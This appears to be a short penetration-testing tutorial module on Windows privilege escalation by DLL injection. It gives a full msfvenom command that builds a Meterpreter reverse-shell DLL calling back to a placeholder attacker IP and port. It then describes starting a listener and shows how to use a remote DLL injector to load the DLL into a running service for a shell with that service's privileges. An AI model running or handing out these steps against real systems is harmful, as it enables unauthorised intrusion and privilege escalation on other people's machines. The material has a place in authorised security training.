# DLL Injection
Privilege escalation is oftwn possible through the DLL injection technique which is decribed in this module.
## Create a Malicious DLL
We can use [MSFVenom]() to create a malicious reverse shell DLL with the following command,
```
root@attacker-machine:~# ./msfvenom -payload windows/meterpreter/reverse_tcp LHOST=(ATTACKER IP ADDRESS) LPORT=(ATTACKER PORT) -f dll > injectme.dll 
```
Now, we simply start the `exploit/multi/handler` listener on the attacker machine on the port specified during the creation of the DLL above. Ensure that the architecture, ports, IP, and payload all match correctly.
## Inject the DLL
Once we have infiltrated the DLL to the target system, we also need to infiltrate the [Remote DLL Injector](https://securityxploded.com/remote-dll-injector.php) binary. This will inject our malicious binary into the running address space of the service we intend to exploit. Below is the basic usage of the injector,
```
   RemoteDLLInjector.exe  <pid>  <dll_file_path>       
        -h                This help screen
        <pid>             Process ID of remote process to Inject DLL
        <dll_file_path>   Full path of DLL to be injected
```
Oncde injected, the process/service will execute the malicious DLL and we should get a reverse Meterpreter session to our attacker system with the effective UID of the service's permissions.
## Reference
* [Pentestlab Blog - DLL Injection](https://pentestlab.blog/2017/04/04/dll-injection/)
